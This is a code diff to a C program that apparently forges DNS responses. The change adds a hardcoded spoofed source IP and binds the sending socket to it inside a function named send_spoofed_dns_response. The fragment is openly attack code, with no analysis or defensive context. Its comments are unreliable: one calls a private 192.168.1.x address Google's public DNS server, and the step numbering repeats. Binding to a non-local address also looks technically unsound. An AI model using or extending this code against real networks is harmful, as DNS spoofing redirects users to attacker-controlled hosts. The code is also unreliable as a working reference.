@@ -7,7 +7,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 
-
+#define SPOOFED_SOURCE_IP  "192.168.1.207"
 #define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
 #define DNS_SERVER_PORT 53      // Standard DNS port
 #define BUFFER_SIZE 512         // Buffer size for the DNS query and response
@@ -213,6 +213,19 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
         perror("Socket creation failed");
         exit(EXIT_FAILURE);
     }
+
+
+        // Step 2: Bind the socket to the spoofed source IP
+    memset(&source_addr, 0, sizeof(source_addr));
+    source_addr.sin_family = AF_INET;
+    source_addr.sin_port = htons(0); // Bind to any available port
+    inet_pton(AF_INET, SPOOFED_SOURCE_IP, &source_addr.sin_addr);
+    if (bind(sockfd, (struct sockaddr *)&source_addr, sizeof(source_addr)) < 0) {
+        perror("Binding failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
 
     // Step 2: Configure the server address for sending the spoofed response
     memset(&server_addr, 0, sizeof(server_addr));
